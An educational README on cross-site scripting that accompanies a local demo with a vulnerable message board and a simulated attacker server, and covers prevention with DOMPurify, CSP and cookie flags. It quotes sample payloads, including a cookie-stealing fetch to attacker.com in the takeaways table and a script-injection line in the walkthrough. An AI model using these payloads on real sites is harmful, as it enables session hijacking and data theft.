# 💀 Cross-Site Scripting (XSS) Attack

## Overview
**Cross-Site Scripting (XSS)** is one of the most common and dangerous vulnerabilities in web applications. It allows attackers to inject and execute **malicious JavaScript** in the browser of unsuspecting users. This malicious script executes within the context of a trusted website, enabling the attacker to steal sensitive information or perform unauthorized actions on behalf of the user.

---

## ⚙️ Core Concept
XSS occurs when user input is improperly handled — particularly when untrusted data is inserted into a web page’s HTML or JavaScript context **without proper sanitization or escaping**. When this happens, the injected script runs as if it were legitimate site code, bypassing origin boundaries and the browser’s trust model.

Unlike vulnerabilities such as SQL injection (which target the backend), XSS targets the **frontend — the browser**. Its damage, however, can lead to full account takeovers, data exfiltration, or complete session hijacking.

---

## 🧩 Types of XSS

### 1. **Stored (Persistent) XSS**
Occurs when malicious input is **permanently stored** on the server — for example, in a database or message board. Each time another user views the infected page, the malicious script executes in their browser.

Example scenario:
- Attacker posts a comment like `<script>stealCookies()</script>`.
- The website saves it to the database without sanitization.
- Every visitor who views that comment executes the script.

### 2. **Reflected XSS**
Happens when malicious input is **immediately reflected** in a response without being stored.
- Typically found in search results or URL parameters.
- Example: a search form that echoes back the query string directly into HTML.

### 3. **DOM-Based XSS**
Occurs entirely in the **browser’s JavaScript environment** — without any server interaction.
- Vulnerable client-side code directly reads data from the URL, fragment, or other sources and injects it into the DOM.
- Example: `document.body.innerHTML = location.hash;`

---

## 🔍 Real-World Flow (Your Demo Explanation)

In your demo setup:

- **xss-vulnerable-code folder** represents a **target/victim website**. It allows users to post messages.
- If the input is not properly sanitized, attackers can post malicious scripts that get executed when other users view them.
- **xss-attacker folder** simulates the attacker’s server that collects stolen data like cookies or `localStorage` values from victims.

### Step-by-step:
1. The attacker injects a script (like `<script src='http://localhost:8000/public/script.js'></script>`) into a vulnerable input field.
2. The browser executes the script when other users load the page.
3. The script (running in the victim’s browser) collects cookies and `localStorage` data.
4. It sends the data to the attacker’s server (`/victim` endpoint) via a POST request.

This mimics how real-world XSS attacks steal authentication tokens, session IDs, or confidential data.

---

## 🧠 Impact
Once the attacker can execute JavaScript in a victim’s browser, they can:
- Steal authentication cookies and impersonate the user.
- Access browser storage (`localStorage`, `sessionStorage`, etc.).
- Modify the page content (defacement).
- Redirect users to malicious websites.
- Record keystrokes or capture credentials via fake forms.
- Perform actions on behalf of the user (CSRF chaining).

---

## 🔒 Prevention Techniques

### 1. **Input Sanitization and Output Encoding**
- Use libraries like **DOMPurify** to clean HTML before inserting it into the DOM.
- Always sanitize data on both **client and server sides**.

### 2. **Content Security Policy (CSP)**
- Define which sources of scripts are allowed.
- Example: `Content-Security-Policy: script-src 'self' https://trusted.cdn.com;`
- CSP blocks inline scripts and external malicious URLs.

### 3. **Avoid Dangerous JS APIs**
- Never use `eval()`, `new Function()`, or string-based `setTimeout()`.
- Avoid `innerHTML` for inserting untrusted content; prefer `textContent` or safe templating.

### 4. **Cookie Flags**
- Use the `HttpOnly` flag to make cookies inaccessible to JavaScript.
- Add `Secure` and `SameSite` attributes for extra protection.

### 5. **Sanitize on Server**
- Use libraries like `dompurify` (with jsdom for Node.js) before saving any HTML content.
- Example from your code: `purify.sanitize(req.body.content)` ensures database-stored content is safe.

---

## 🧰 Tools and Libraries
- **DOMPurify**: Cleans HTML and removes malicious scripts.
- **Helmet (Node.js)**: Adds CSP, XSS, and security headers automatically.
- **OWASP Cheat Sheets**: Excellent reference for preventing XSS and related vulnerabilities.

---

## ⚠️ Key Takeaways
| Concept | Description |
|----------|--------------|
| Attack Vector | JavaScript injection via unsanitized input |
| Affected Layer | Browser (frontend) |
| Example Payload | `<script>fetch('http://attacker.com?c='+document.cookie)</script>` |
| Defense | Sanitize input, use CSP, avoid inline JS |
| Real Demo | Your setup demonstrates how attacker scripts steal victim data |

---

## 🌐 Related Concepts
- **Same-Origin Policy (SOP)** – Restricts cross-domain access but doesn’t stop XSS within the same origin.
- **Cross-Site Request Forgery (CSRF)** – Exploits authenticated sessions but doesn’t require code injection.
- **CSP (Content Security Policy)** – Modern browser protection against script injection.

---

## 📚 References
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-prevention)
- [MDN Web Docs – Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)

---

## 🧩 Summary
Cross-Site Scripting (XSS) is a browser-based attack that executes malicious JavaScript in a victim’s context. It arises from improper input validation and can lead to severe data breaches, session hijacking, and unauthorized actions. 

Your example perfectly shows the contrast between a **vulnerable site** and a **malicious attacker’s server**, emphasizing how a few lines of unsafe code can compromise entire user sessions.

